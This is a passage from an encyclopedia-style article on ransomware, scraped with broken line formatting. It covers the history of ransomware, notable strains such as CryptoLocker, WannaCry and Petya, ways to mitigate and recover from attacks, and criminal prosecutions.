 in the months following, including CryptoLocker 2.0 (thought not to be related to CryptoLocker), CryptoDefense (which initially contained a major design flaw that stored the private key on the infected system in a 
user-retrievable location
, due to its use of Windows' built-in encryption APIs),
[
28
]
[
40
]
[
41
]
[
42
]
 and the August 2014 discovery of a Trojan specifically targeting 
network-attached storage
 devices produced by 
Synology
.
[
43
]
 In January 2015, it was reported that ransomware-styled attacks have occurred against individual websites via hacking, and through ransomware designed to target 
Linux
-based 
web servers
.
[
44
]
[
45
]
[
46
]


In 2022, Costa Rica received widespread 
Conti
 ransomware attacks affecting government, healthcare and industry.
[
47
]
 This lead President Rodrigo Chaves to declare a state of emergency and announce that Costa Rica is "at war" with its ransomware hackers.
[
48
]


In some infections, there is a two-stage payload, common in many malware systems. The user is tricked into running a script, which downloads the main virus and executes it. In early versions of the dual-payload system, the script was contained in a Microsoft Office document with an attached VBScript macro, or in a windows scripting facility (WSF) file. As detection systems started blocking these first stage payloads, the Microsoft Malware Protection Center identified a trend away toward 
LNK files
 with self-contained Microsoft Windows 
PowerShell
 scripts.
[
49
]
 In 2016, PowerShell was found to be involved in nearly 40% of endpoint security incidents.
[
50
]


Some ransomware strains have used 
proxies
 tied to 
Tor
 
hidden services
 to connect to their 
command and control
 servers, increasing the difficulty of tracing the exact location of the criminals.
[
51
]
[
52
]
 Furthermore, 
dark web
 vendors have increasingly
[
when?
]
 started to offer the technology 
as a service
, wherein ransomware is sold, ready for deployment on victims' machines, on a subscription basis, similarly to Adobe Creative Cloud or Office 365.
[
52
]
[
53
]
[
54
]


Symantec has classified ransomware to be the most dangerous cyber threat.
[
55
]




Non-encrypting ransomware
[
edit
]


In August 2010, Russian authorities arrested nine individuals connected to a ransomware Trojan known as WinLock. Unlike the previous Gpcode Trojan, WinLock did not use encryption. Instead, WinLock trivially restricted access to the system by displaying pornographic images and asked users to send a 
premium-rate SMS
 (costing around US$10) to receive a code that could be used to unlock their machines. The scam hit numerous users across Russia and neighbouring countries—reportedly earning the group over US$16 million.
[
19
]
[
56
]


In 2011, a ransomware Trojan surfaced that imitated the 
Windows Product Activation
 notice,  and informed users that a system's Windows installation had to be re-activated due to "[being a] victim of fraud". An online activation option was offered (like the actual Windows activation process), but was unavailable, requiring the user to call one of six 
international numbers
 to input a 6-digit code. While the malware claimed that this call would be free, it was routed through a rogue operator in a country with high international phone rates, who placed the call on hold, causing the user to incur large international 
long-distance
 charges.
[
17
]


In 2012, Symantec reported spread out of Eastern Europe of ransomware with a lock screen purporting to be law enforcement demanding payment for illegal activity.
[
57
]


In February 2013, a ransomware Trojan based on the Stamp.EK 
exploit kit
 surfaced; the malware was distributed via sites hosted on the project hosting services 
SourceForge
 and 
GitHub
 that claimed to offer "fake nude pics" of celebrities.
[
58
]
 In July 2013, an 
OS X
-specific ransomware Trojan surfaced, which displays a web page that accuses the user of downloading pornography. Unlike its Windows-based counterparts, it does not block the entire computer, but simply 
exploits the behaviour of the web browser itself
 to frustrate attempts to close the page through normal means.
[
59
]


In July 2013, a 21-year-old man from Virginia, whose computer coincidentally did contain pornographic photographs of underage girls with whom he had conducted sexualized communications, turned himself in to police after receiving and being deceived by 
FBI MoneyPak Ransomware
 accusing him of possessing child pornography. An investigation discovered the incriminating files, and the man was charged with 
child sexual abuse
 and possession of child pornography.
[
60
]




Exfiltration (Leakware / Doxware)
[
edit
]


The converse of ransomware is a 
cryptovirology
 attack invented by Adam L. Young that threatens to publish stolen information from the victim's computer system rather than deny the victim access to it.
[
61
]
 In a leakware attack, malware exfiltrates sensitive host data either to the attacker or alternatively, to remote instances of the malware, and the attacker threatens to publish the victim's data unless a ransom is paid. The attack was presented at 
West Point
 in 2003 and was summarized in the book 
Malicious Cryptography
 as follows, "The attack differs from the extortion attack in the following way. In the extortion attack, the victim is denied access to its own valuable information and has to pay to get it back, where in the attack that is presented here the victim retains access to the information but its disclosure is at the discretion of the computer virus".
[
62
]
 The attack is rooted in game theory and was originally dubbed "non-zero sum games and survivable malware". The attack can yield monetary gain in cases where the malware acquires access to information that may damage the victim user or organization, e.g., the reputational damage that could result from publishing proof that the attack itself was a success.

Common targets for exfiltration include:



third party information stored by the primary victim (such as customer account information or health records);


information proprietary to the victim (such as trade secrets and product information)


embarrassing information (such as the victim's health information or information about the victim's personal past)


Exfiltration attacks are usually targeted, with a curated victim list, and often preliminary surveillance of the victim's systems to find potential data targets and weaknesses.
[
63
]
[
64
]




Mobile ransomware
[
edit
]


With the increased popularity of ransomware on PC platforms, ransomware targeting 
mobile operating systems
 has also proliferated. Typically, mobile ransomware payloads are blockers, as there is little incentive to encrypt data since it can be easily restored via online synchronization.
[
65
]
 Mobile ransomware typically targets the 
Android
 platform, as it allows applications to be installed from third-party sources.
[
65
]
[
66
]
 The payload is typically distributed as an 
APK file
 installed by an unsuspecting user; it may attempt to display a blocking message over top of all other applications,
[
66
]
 while another used a form of 
clickjacking
 to cause the user to give it "device administrator" privileges to achieve deeper access to the system.
[
67
]


Different tactics have been used on 
iOS
 devices, such as exploiting 
iCloud
 accounts and using the 
Find My iPhone
 system to lock access to the device.
[
68
]
 On 
iOS 10.3
, Apple patched a bug in the handling of JavaScript pop-up windows in 
Safari
 that had been exploited by ransomware websites.
[
69
]

It recently
[
when?
]
 has been shown that ransomware may also target ARM architectures like those that can be found in various Internet-of-Things (IoT) devices, such as Industrial IoT edge devices.
[
70
]


In August 2019 researchers demonstrated it's possible to infect 
DSLR cameras
 with ransomware.
[
71
]
 Digital cameras often use 
Picture Transfer Protocol
 (PTP - standard protocol used to transfer files.) Researchers found that it was possible to exploit vulnerabilities in the protocol to infect target camera(s) with ransomware (or execute any arbitrary code). This attack was presented at the 
Defcon
 security conference in Las Vegas as a proof of concept attack (not as actual armed malware).



Progression of attacks
[
edit
]


The first attacks were on random users, typically infected through email attachments sent by small groups of criminals, demanding a few hundred dollars in cryptocurrency to unlock files (typically a private individual's photographs and documents) that the ransomware had encrypted. As ransomware matured as a business, organised gangs entered the field, advertising on the 
dark Web
 for experts, and 
outsourcing
 functions. This led to improvement in the quality of ransomware and its success. Rather than random emails, the gangs stole credentials, found vulnerabilities in target networks, and improved the malware to avoid detection by anti-malware scanners. Ransoms demanded escalated into the much larger sums (millions) that an enterprise would pay to recover its data, rather than what an individual would pay for their documents (hundreds). 

In 2016, a significant uptick in ransomware attacks on hospitals was noted. According to the 2017 Internet Security Threat Report from Symantec Corp, ransomware affected not only IT systems but also patient care, clinical operations, and billing. Online criminals may be motivated by the money available and sense of urgency within the healthcare system.
[
72
]


Ransomware is growing rapidly across the internet users but also for the IoT environment.
[
57
]
 The big problem is that millions of dollars are lost by some organizations and industries that have decided to pay, such as the Hollywood Presbyterian Medical Center and the MedStar Health.
[
73
]


According to Symantec 2019 ISTR report, for the first time since 2013, in 2018 there was an observed decrease in ransomware activity with a drop of 20 percent. Before 2017, consumers were the preferred victims, but in 2017 this changed dramatically, it moved to the enterprises. In 2018 this path accelerated with 81 percent infections which represented a 12 percent increase.
[
74
]
 The common distribution method today is based on email campaigns.

In late 2019 ransomware group Maze downloaded companies' sensitive files before locking them, and threatened to leak the data publicly if the ransom was not paid; in at least one case they did this. Many other gangs followed; "leak sites" were created on the dark web where stolen data could be accessed. Later attacks focussed on the threat to leak data, without necessarily locking it—this negated the protection afforded victims by robust backup procedures. As of 2023
[update]
 there is a risk of hostile governments using ransomware to conceal what is actually intelligence gathering.
[
75
]


The first reported death following a ransomware attack was at a German hospital in October 2020.
[
76
]


A significant increase in ransomware attacks occurred during the 2020 
COVID-19 pandemic
. Evidence has demonstrated  that the targeted institutions of these attacks included government, finance, and healthcare. Researchers have contended that several different factors can explain the increase in attacks during this time. However, a major factor is that 
remote work
, which became the norm for many industries in 2020, led to the surge in attacks because of the lack of security in comparison to traditional work environments.
[
77
]




Notable attack targets
[
edit
]


Further information: 
List of cyberattacks § Ransomware attacks


Notable software packages
[
edit
]


Reveton
[
edit
]


Main article: 
FBI MoneyPak Ransomware


A Reveton payload, fraudulently claiming that the user must pay a fine to the 
Metropolitan Police Service


In 2012, a major ransomware Trojan known as Reveton began to spread. Based on the Citadel 
Trojan
 (which, itself, is based on the 
Zeus
 Trojan), its payload displays a warning purportedly from a law enforcement agency claiming that the computer has been used for illegal activities, such as downloading 
unlicensed software
 or 
child pornography
. Due to this behaviour, it is commonly referred to as the "Police Trojan".
[
78
]
[
79
]
[
80
]
 The warning informs the user that to unlock their system, they would have to pay a fine using a voucher from an anonymous prepaid cash service such as 
Ukash
 or 
paysafecard
. To increase the illusion that the computer is being tracked by law enforcement, the screen also displays the computer's 
IP address
, while some versions display footage from a victim's 
webcam
 to give the illusion that the user is being recorded.
[
7
]
[
81
]


Reveton initially began spreading in various European countries in early 2012.
[
7
]
 Variants were localized with templates branded with the logos of different law enforcement organizations based on the user's country; for example, variants used in the United Kingdom contained the branding of organizations such as the 
Metropolitan Police Service
 and the 
Police National E-Crime Unit
. Another version contained the logo of the 
royalty collection society
 
PRS for Music
, which specifically accused the user of illegally downloading music.
[
82
]
 In a statement warning the public about the malware, the Metropolitan Police clarified that they would never lock a computer in such a way as part of an investigation.
[
7
]
[
18
]


In May 2012, 
Trend Micro
 threat researchers discovered templates for variations for the 
United States
 and 
Canada
, suggesting that its authors may have been planning to target users in North America.
[
83
]
 By August 2012, a new variant of Reveton began to spread in the United States, claiming to require the payment of a 
$
200 fine to the FBI using a 
MoneyPak
 card.
[
8
]
[
9
]
[
81
]
 In February 2013, a Russian citizen was arrested in 
Dubai
 by Spanish authorities for his connection to a crime ring that had been using Reveton; ten other individuals were arrested on 
money laundering
 charges.
[
84
]
 In August 2014, 
Avast Software
 reported that it had found new variants of Reveton that also distribute password-stealing malware as part of its payload.
[
85
]




CryptoLocker
[
edit
]


Main article: 
CryptoLocker


Encrypting ransomware reappeared in September 2013 with a Trojan known as 
CryptoLocker
, which generated a 2048-bit RSA key pair and uploaded in turn to a command-and-control server, and used to encrypt files using a 
whitelist
 of specific 
file extensions
. The malware threatened to delete the private key if a payment of 
Bitcoin
 or a pre-paid cash voucher was not made within 3 days of the infection. Due to the extremely large key size it uses, analysts and those affected by the Trojan considered CryptoLocker extremely difficult to repair.
[
27
]
[
86
]
[
87
]
[
88
]
 Even after the deadline passed, the private key could still be obtained using an online tool, but the price would increase to 10 BTC—which cost approximately US$2300 as of November 2013.
[
89
]
[
90
]


CryptoLocker was isolated by the seizure of the 
Gameover ZeuS
 
botnet
 as part of 
Operation Tovar
, as officially announced by the 
U.S. Department of Justice
 on 2 June 2014. The Department of Justice also publicly issued an 
indictment
 against the Russian hacker Evgeniy Bogachev for his alleged involvement in the botnet.
[
91
]
[
92
]
 It was estimated that at least US$3 million was extorted with the malware before the shutdown.
[
12
]




CryptoLocker.F and TorrentLocker
[
edit
]


In September 2014, a wave of ransomware Trojans surfaced that first targeted users in 
Australia
, under the names 
CryptoWall
 and 
CryptoLocker
 (which is, as with CryptoLocker 2.0, unrelated to the original CryptoLocker). The Trojans spread via fraudulent e-mails claiming to be failed parcel delivery notices from 
Australia Post
; to evade detection by automatic e-mail scanners that follow all links on a page to scan for malware, this variant was designed to require users to visit a web page and enter a 
CAPTCHA
 code before the payload is actually downloaded, preventing such automated processes from being able to scan the payload. 
Symantec
 determined that these new variants, which it identified as 
CryptoLocker.F
, were again, unrelated to the original CryptoLocker due to differences in their operation.
[
93
]
[
94
]
 A notable victim of the Trojans was the 
Australian Broadcasting Corporation
; live programming on its television 
news channel
 
ABC News 24
 was disrupted for half an hour and shifted to 
Melbourne
 studios due to a CryptoWall infection on computers at its 
Sydney
 studio.
[
95
]
[
96
]
[
97
]


Another Trojan in this wave, 
TorrentLocker
, initially contained a design flaw comparable to CryptoDefense; it used the same 
keystream
 for every infected computer, making the encryption trivial to overcome. However, this flaw was later fixed.
[
40
]
 By late-November 2014, it was estimated that over 9,000 users had been infected by TorrentLocker in Australia alone, trailing only Turkey with 11,700 infections.
[
98
]




CryptoWall
[
edit
]


Another major ransomware Trojan targeting Windows, CryptoWall, first appeared in 2014. One strain of CryptoWall was distributed as part of a 
malvertising
 campaign on the 
Zedo
 ad network in late-September 2014 that targeted several major websites; the ads redirected to rogue websites that used browser plugin exploits to download the payload. A 
Barracuda Networks
 researcher also noted that the payload was signed with a 
digital signature
 in an effort to appear trustworthy to security software.
[
99
]

CryptoWall 3.0 used a payload written in 
JavaScript
 as part of an email attachment, which downloads executables disguised as 
JPG
 images. To further evade detection, the malware creates new instances of 
explorer.exe
 and 
svchost.exe
 to communicate with its servers. When encrypting files, the malware also deletes volume shadow copies and installs spyware that steals passwords and 
Bitcoin wallets
.
[
100
]


The FBI reported in June 2015 that nearly 1,000 victims had contacted the bureau's 
Internet Crime Complaint Center
 to report CryptoWall infections, and estimated losses of at least $18 million.
[
13
]


The most recent
[
when?
]
 version, CryptoWall 4.0, enhanced its code to avoid antivirus detection, and encrypts not only the data in files but also the file names.
[
101
]




Fusob
[
edit
]


Fusob is a major family of mobile ransomware. Between April 2015 and March 2016, about 56 percent of accounted mobile ransomware was Fusob.
[
102
]


Like most other pieces of ransomware, it employs scare tactics to extort a hefty sum from the user.
[
103
]
 The app 
acts as if it were a notice from the authorities
, demanding the victim to pay a fine from $100 to $200 
USD
 or otherwise face a fictitious criminal charge. Fusob requests iTunes gift cards for payment, unlike most cryptocurrency-centric ransomware.

In order to infect devices, Fusob 
masquerades
 as a pornographic video player.
[
104
]
 When it is installed, it first checks the device's system language. If the language is Russian or Eastern-European, Fusob remains dormant. Otherwise, it locks the device and demands ransom. About 40% of victims are in Germany, while the United Kingdom encompasses 14.5% of victims and the US encompasses 11.4%. Fusob and Small (another family of ransomware) represented over 93% of mobile ransomware between 2015 and 2016.



WannaCry
[
edit
]


Main article: 
WannaCry ransomware attack


In May 2017, the 
WannaCry ransomware attack
 spread through the Internet, using an exploit vector named 
EternalBlue
, which was allegedly leaked from the U.S. 
National Security Agency
. The ransomware attack, unprecedented in scale,
[
105
]
 infected more than 230,000 computers in over 150 countries,
[
106
]
 using 20 different languages to demand money from users using 
Bitcoin
 cryptocurrency. WannaCry demanded US$300 per computer.
[
107
]
 The attack affected 
Telefónica
 and several other large companies in Spain, as well as parts of the British 
National Health Service
 (NHS), where at least 16 hospitals had to turn away patients or cancel scheduled operations,
[
108
]
 
FedEx
, 
Deutsche Bahn
, 
Honda
,
[
109
]
 
Renault
, as well as the 
Russian Interior Ministry
 and Russian telecom 
MegaFon
.
[
110
]
 The attackers gave their victims a 7-day deadline from the day their computers got infected, after which the encrypted files would be deleted.
[
111
]




Petya
[
edit
]


Main article: 
Petya (malware)


See also: 
2017 cyberattacks on Ukraine


Petya was first discovered in March 2016; unlike other forms of encrypting ransomware, the malware aimed to infect the 
master boot record
, installing a payload which encrypts the file tables of the 
NTFS
 file system the next time that the infected system boots, blocking the system from booting into Windows at all until the ransom is paid. 
Check Point
 reported that despite what it believed to be an innovative evolution in ransomware design, it had resulted in relatively-fewer infections than other ransomware active around the same time frame.
[
112
]


On 27 June 2017, a heavily modified version of Petya was used for a global cyberattack primarily targeting 
Ukraine
 (but affecting many countries
[
113
]
). This version had been modified to propagate using the same EternalBlue exploit that was used by WannaCry. Due to another design change, it is also unable to actually unlock a system after the ransom is paid; this led to security analysts speculating that the attack was not meant to generate illicit profit, but to simply cause disruption.
[
114
]
[
115
]




Bad Rabbit
[
edit
]


"Bad Rabbit" redirects here. For the band, see 
Bad Rabbits
. For the computer worm, see 
Badbunny
.


On 24 October 2017, some users in 
Russia
 and Ukraine reported a new ransomware attack, named "Bad Rabbit", which follows a similar pattern to WannaCry and Petya by encrypting the user's file tables and then demands a Bitcoin payment to decrypt them. 
ESET
 believed the ransomware to have been distributed by a bogus update to 
Adobe Flash
 software.
[
116
]
 Among agencies that were affected by the ransomware were: 
Interfax
, 
Odesa International Airport
, 
Kyiv Metro
, and the Ministry of Infrastructure of Ukraine.
[
117
]
 As it used corporate network structures to spread, the ransomware was also discovered in other countries, including Turkey, Germany, Poland, Japan, South Korea, and the United States.
[
118
]
 Experts believed the ransomware attack was tied to the Petya attack in Ukraine (especially because Bad Rabbit's code has many overlapping and analogical elements to the code of Petya/NotPetya,
[
119
]
 appending to CrowdStrike Bad Rabbit and NotPetya's dynamic link library (DLL) share 67 percent of the same code
[
120
]
) though the only identity to the culprits are the names of characters from the 
Game of Thrones
 series embedded within the code.
[
118
]


Security experts found that the ransomware did not use the EternalBlue exploit to spread, and a simple method to inoculate an unaffected machine running older Windows versions was found by 24 October 2017.
[
121
]
[
122
]
 Further, the sites that had been used to spread the bogus Flash updating have gone offline or removed the problematic files within a few days of its discovery, effectively killing off the spread of Bad Rabbit.
[
118
]




SamSam
[
edit
]


In 2016, a new strain of ransomware emerged that was targeting 
JBoss
 servers.
[
123
]
 This strain, named "
SamSam
", was found to bypass the process of phishing or illicit downloads in favor of exploiting vulnerabilities on weak servers.
[
124
]
 The malware uses a 
Remote Desktop Protocol
 
brute-force attack
 to guess weak passwords until one is broken. The virus has been behind attacks on government and healthcare targets, with notable hacks occurring against the town of 
Farmington, New Mexico
, the 
Colorado Department of Transportation
, 
Davidson County, North Carolina
, and most recently,
[
when?
]
 a 
ransomware attack
 on the infrastructure of 
Atlanta
.
[
124
]


Mohammad Mehdi Shah Mansouri (born in 
Qom
, 
Iran
 in 1991) and Faramarz Shahi Savandi (born in 
Shiraz
, 
Iran
, in 1984) are wanted by the 
FBI
 for allegedly launching SamSam ransomware.
[
125
]
 The two have allegedly made $6 million from extortion and caused over $30 million in damages using the malware.
[
126
]




DarkSide
[
edit
]


On May 7, 2021, a cyberattack was executed on the US Colonial Pipeline. The 
Federal Bureau of Investigation
 identified 
DarkSide
 as the perpetrator of the 
Colonial Pipeline ransomware attack
, perpetrated by 
malicious code
, that led to a voluntary shutdown of the main pipeline supplying 45% of fuel to the 
East Coast of the United States
. The attack was described as the worst cyberattack to date on the U.S. 
critical infrastructure
. DarkSide successfully extorted about 75 
Bitcoin
 (almost US$5 million) from Colonial Pipeline. U.S. officials are investigating whether the attack was purely criminal or took place with the involvement of the Russian government or another state sponsor. Following the attack, DarkSide posted a statement claiming that "We are apolitical, we do not participate in 
geopolitics
...Our goal is to make money and not creating problems for society."

In May 2021, the FBI and 
Cybersecurity and Infrastructure Security Agency
 (CISA) issued a joint alert urging the owners and operators of critical infrastructure to take certain steps to reduce their vulnerability to DarkSide ransomware and ransomware in general.



Syskey
[
edit
]


Syskey
 is a utility that was included with 
Windows NT
-based operating systems to encrypt the 
user account database
, optionally with a password. The tool has sometimes been effectively used as ransomware during 
technical support scams
—where a caller with remote access to the computer may use the tool to lock the user out of their computer with a password known only to them.
[
127
]
 Syskey was removed from later versions of 
Windows 10
 and 
Windows Server
 in 2017, due to being obsolete and "known to be used by hackers as part of ransomware scams".
[
128
]
[
129
]




Ransomware-as-a-service
[
edit
]


Ransomware-as-a-service (RaaS) became a notable method after the Russia-based
[
130
]
 or Russian-speaking
[
131
]
 group 
REvil
 staged operations against several targets, including the Brazil-based  
JBS S.A.
 in May 2021, and the US-based 
Kaseya Limited
 in July 2021.
[
132
]
 After a July 9, 2021 phone call between United States president 
Joe Biden
 and Russian president 
Vladimir Putin
, Biden told the press, "I made it very clear to him that the United States expects when a ransomware operation is coming from his soil even though it’s not sponsored by the state, we expect them to act if we give them enough information to act on who that is." Biden later added that the United States would take the group's servers down if Putin did not.
[
133
]
[
134
]
 Four days later, REvil websites and other infrastructure vanished from the internet.
[
135
]




Mitigation
[
edit
]


If an attack is suspected or detected in its early stages, it takes some time for encryption to take place; immediate removal of the malware (a relatively simple process) before it has completed would stop further damage to data, without salvaging any already lost.
[
136
]
[
137
]


Security experts have suggested precautionary measures for dealing with ransomware. Using software or other security policies to block known payloads from launching will help to prevent infection, but will not protect against all attacks
[
27
]
[
138
]
 As such, having a proper 
backup
 solution is a critical component to defending against ransomware. Note that, because many ransomware attackers will not only encrypt the victim's live machine but it will also attempt to delete any hot backups stored locally or on accessible over the network on a 
NAS
, it's also critical to maintain "offline" 
backups
 of data 
stored in locations inaccessible from any potentially infected computer
, such as external storage drives or devices that 
do not have any access to any network (including the Internet)
, prevents them from being accessed by the ransomware. Moreover, if using a NAS or 
Cloud storage
, then the computer should have 
append-only
 permission to the destination storage, such that it cannot delete or overwrite previous backups. According to 
comodo
, applying two 
Attack Surface
 Reduction on 
OS
/
Kernel
 provides a materially-reduced attack surface which results in a heightened security posture.
[
139
]
[
140
]
[
141
]


Installing security 
updates
 issued by software vendors can mitigate the 
vulnerabilities
 leveraged by certain strains to propagate.
[
142
]
[
143
]
[
144
]
[
145
]
[
146
]
 Other measures include 
cyber hygiene
 − exercising caution when opening 
e-mail attachments
 and links, 
network segmentation
, and keeping critical computers isolated from networks.
[
147
]
[
148
]
 Furthermore, to mitigate the spread of ransomware measures of 
infection control
 can be applied.
[
149
]
 Such may include disconnecting infected machines from all networks, educational programs,
[
150
]
 effective communication channels, malware surveillance
[
original research?
]
 and ways of collective participation
[
149
]


In August 2021, the 
Cybersecurity and Infrastructure Security Agency (CISA)
 released a report that provided guidance for how to mitigate ransomware attacks. This was due to a significant jump in recent attacks related to ransomware. These attacks included aggression against a US pipeline company and a software company, which impacted the downstream customers of 
MSPs
.
[
151
]




File system defenses against ransomware
[
edit
]


A number of file systems keep snapshots of the data they hold, which can be used to recover the contents of files from a time prior to the ransomware attack in the event the ransomware does not disable it.



On Windows, the 
Volume shadow copy
 (VSS) is often used to store backups of data; ransomware often targets these snapshots to prevent recovery and therefore it is often advisable to disable user access to the user tool 
VSSadmin.exe
 to reduce the risk that ransomware can disable or delete past copies.


On Windows 10, users can add specific directories or files to Controlled Folder Access in Windows Defender to protect them from ransomware.
[
152
]
 It is advised to add backup and other important directories to Controlled Folder Access.


Unless malware gains root on the ZFS host system in deploying an attack coded to issue ZFS administrative commands, file servers running 
ZFS
 are broadly immune to ransomware, because ZFS is capable of snapshotting even a large file system many times an hour, and these snapshots are immutable (read only) and easily rolled back or files recovered in the event of data corruption.
[
153
]
 In general, only an administrator can delete (but cannot modify) snapshots.


File decryption and recovery
[
edit
]


There are a number of tools intended specifically to decrypt files locked by ransomware, although successful recovery may not be possible.
[
2
]
[
154
]
 If the same encryption key is used for all files, decryption tools use files for which there are both uncorrupted backups and encrypted copies (a 
known-plaintext attack
 in the jargon of 
cryptanalysis
. But it only works when the cipher the attacker used was weak to begin with, being vulnerable to known-plaintext attack); recovery of the key, if it is possible, may take several days.
[
155
]
 Free ransomware decryption tools can help decrypt files encrypted by the following forms of ransomware: AES_NI, Alcatraz Locker, Apocalypse, BadBlock, Bart, BTCWare, Crypt888, CryptoMix, CrySiS, EncrypTile, FindZip, Globe, 
Hidden Tear
, Jigsaw, LambdaLocker, Legion, NoobCrypt, Stampado, SZFLocker, 
TeslaCrypt
, XData.
[
156
]
 Ransomware encryption that has been cracked by security researchers is typically abandoned for criminal purposes; thus in practice most attacks cannot be reverted by breaking encryption.
[
157
]


The No More Ransom Project is an initiative by the 
Netherlands' police
's National High Tech Crime Unit, 
Europol
’s 
European Cybercrime Centre
, 
Kaspersky Lab
 and 
McAfee
 to help ransomware victims recover their data without paying a ransom.
[
158
]
 They offer a free CryptoSheriff tool to analyze encrypted files and search for decryption tools.
[
159
]


In addition, old copies of files may exist on the disk, which has been previously deleted. In some cases, these deleted versions may still be recoverable using 
software designed for that purpose
.

A 2019 
ProPublica
 investigation found the cybersecurity firms Proven Data Recovery and Monstercloud, which advertised ransom-free decryption services, would typically simply pay the ransom and charge the victim a higher price.
[
157
]
 SamSam hackers dealt with Proven Data so frequently that they would recommend the company to victims having technical difficulties making payment.
[
157
]
 Other companies like Coveware were more transparent in offering the service of paying the hackers and patching insecure systems.
[
157
]
 Many American victims found the ransom amount was too low to meet the 
United States Department of Justice
 threshold for federal involvement, but that local police lacked the technical capabilities to help and were often victims themselves.
[
157
]




Criminal arrests and convictions
[
edit
]


Zain Qaiser
[
edit
]


A British student, Zain Qaiser, from Barking, London was jailed for more than six years at 
Kingston upon Thames Crown Court
 for his ransomware attacks in 2019.
[
160
]
 He is said to have been "the most prolific cyber criminal to be sentenced in the UK". He became active when he was only 17. He contacted the Russian controller of one of the most powerful attacks, believed to be the Lurk malware gang, and arranged for a split of his profits. He also contacted online criminals from China and the US to move the money.
[
160
]
 For about one and a half years, he posed as a legitimate supplier of online promotions of book advertising on some of the world's most visited legal pornography websites. Each of the adverts that were promoted on the websites contained the 
Reveton Ransomware
 strain of the malicious Angler Exploit Kit (AEK)
[
161
]
 that seized control of the machine. Investigators discovered about £700,000 of earnings, although his network may have earned more than £4m. He may have hidden some money using cryptocurrencies. The ransomware would instruct victims to buy 
GreenDot MoneyPak
 vouchers and enter the code in the Reveton panel displayed on the screen. This money entered a MoneyPak account managed by Qaiser, who would then deposit the voucher payments into the debit card account of his American co-conspirator,  Raymond Odigie Uadiale. Uadiale was a student at 
Florida International University
 during 2012 and 2013 and later worked for Microsoft. Uadiale would convert the money into 
Liberty Reserve
 digital currency and deposit it into Qaiser's Liberty Reserve account.
[
162
]


A breakthrough, in this case, occurred in May 2013 when authorities from several countries seized the Liberty Reserve servers, obtaining access to all its transactions and account history. Qaiser was running encrypted virtual machines on his Macbook Pro with both Mac and Windows operating systems.
[
163
]
 He could not be tried earlier because he was sectioned (involuntarily committed) under the UK Mental Health Act of 1983 at 
Goodmayes Hospital
 where he was found to be using the hospital Wi-Fi to access his advertising sites. His lawyer claimed that Qaiser had suffered from mental illness.
[
160
]
 Russian police arrested 50 members of the Lurk malware gang in June 2016.
[
164
]
 Uadiale, a naturalized US citizen of Nigerian descent, was jailed for 18 months.
[
165
]




Freedom of speech challenges and criminal punishment
[
edit
]


The publication of proof-of-concept attack code is common among academic researchers and vulnerability researchers.
It teaches the nature of the threat, conveys the gravity of the issues, and enables countermeasures to be devised and put into place. However, lawmakers with the support of law-enforcement bodies are contemplating making the creation of ransomware illegal. In the state of Maryland, the original draft of HB 340 made it a felony to create ransomware, punishable by up to 10 years in prison.
[
166
]
 However, this provision was removed from the final version of the bill.
[
citation needed
]

A minor in Japan was arrested for creating and distributing ransomware code.
[
167
]

Young and 
Yung
 have had the ANSI C source code to a ransomware cryptotrojan on-line, at cryptovirology.com, since 2005 as part of a 
cryptovirology
 book being written. The source code to the cryptotrojan is still live on the Internet and is
associated with a draft of Chapter 2.
[
168
]




See also
[
edit
]




Colonial Pipeline ransomware attack
 – Ransomware attack on American oil pipeline system


BlueKeep (security vulnerability)
 – Windows security hole
Pages displaying short descriptions of redirect targets


Brinkmanship
 – Political and military tactic


Hitler-Ransomware
 – Form of ransomware


Jigsaw (ransomware)
 – Encrypting ransomware created in 2016


Append-only
 – Property of computer data storage


Riskware
 – Software that poses a risk to a host computer


Ryuk (ransomware)
 – Type of ransomware


Reliability engineering
 – Sub-discipline of systems engineering that emphasizes dependability


Air gap (networking)
 – Network security measure


Data redundancy
 – presence of data additional to the actual data that may permit correction of errors in stored or transmitted data
Pages displaying wikidata descriptions as a fallback


Fault tolerance
 – Resilience of systems to component failures or errors


Reliability (computer networking)
 – Protocol acknowledgement capability


Unidirectional network
 – Network device that permits data flow in only one direction


fault-tolerant computer system
 – Resilience of systems to component failures or errors
Pages displaying short descriptions of redirect targets


Byzantine fault
 – Fault in a computer system that presents different symptoms to different observers


Quantum Byzantine agreement
 – Quantum version of the Byzantine agreement protocol


Two Generals' Problem
 – Thought experiment


The Ransomware Hunting Team
 – 2022 nonfiction book by Renee Dudley and Daniel Golden


Initial access broker
 – Hacker selling access to hacked computers




References
[
edit
]






^ 
a
 
b
 
c
 
d
 
e
 
f
 
g
 
Young, A.; M. Yung (1996). 
Cryptovirology: extortion-based security threats and countermeasures
. IEEE Symposium on Security and Privacy. pp. 129–140. 
doi
:
10.1109/SECPRI.1996.502676
. 
ISBN
 
0-8186-7417-2
.




^ 
a
 
b
 
Schofield, Jack (28 July 2016). 
"How can I remove a ransomware infection?"
. 
The Guardian
. Retrieved 
28 July
 2016
.




^
 
Mimoso, Michael (28 March 2016). 
"Petya Ransomware Master File Table Encryption"
. 
threatpost.com
. Retrieved 
28 July
 2016
.




^
 
Justin Luna (21 September 2016). 
"Mamba ransomware encrypts your hard drive, manipulates the boot process"
. 
Newlin
. Retrieved 
5 November
 2016
.




^
 
Min, Donghyun; Ko, Yungwoo; Walker, Ryan; Lee, Junghee; Kim, Youngjae (July 2022). 
"A Content-Based Ransomware Detection and Backup Solid-State Drive for Ransomware Defense"
. 
IEEE Transactions on Computer-Aided Design of Integrated Circuits and Systems
. 
41
 (7): 2038–2051. 
doi
:
10.1109/TCAD.2021.3099084
. 
ISSN
 
0278-0070
. 
S2CID
 
237683171
.




^
 
Cameron, Dell (13 May 2017). 
"Today's Massive Ransomware Attack Was Mostly Preventable; Here's How To Avoid It"
. 
Gizmodo
. Retrieved 
13 May
 2017
.




^ 
a
 
b
 
c
 
d
 
e
 
Dunn, John E. 
"Ransom Trojans spreading beyond Russian heartland"
. TechWorld. Archived from 
the original
 on 2 July 2014
. Retrieved 
10 March
 2012
.




^ 
a
 
b
 
"New Internet scam: Ransomware..."
 FBI. 9 August 2012.




^ 
a
 
b
 
"Citadel malware continues to deliver Reveton ransomware..."
 Internet Crime Complaint Center (IC3). 30 November 2012.




^
 
"Ransomware back in big way, 181.5 million attacks since January"
. 
Help Net Security
. 11 July 2018
. Retrieved 
20 October
 2018
.




^
 
"Update: McAfee: Cyber criminals using Android malware and ransomware the most"
. 
InfoWorld
. 3 June 2013
. Retrieved 
16 September
 2013
.




^ 
a
 
b
 
"Cryptolocker victims to get files back for free"
. BBC News. 6 August 2014
. Retrieved 
18 August
 2014
.




^ 
a
 
b
 
"FBI says crypto ransomware has raked in >$18 million for cybercriminals"
. 
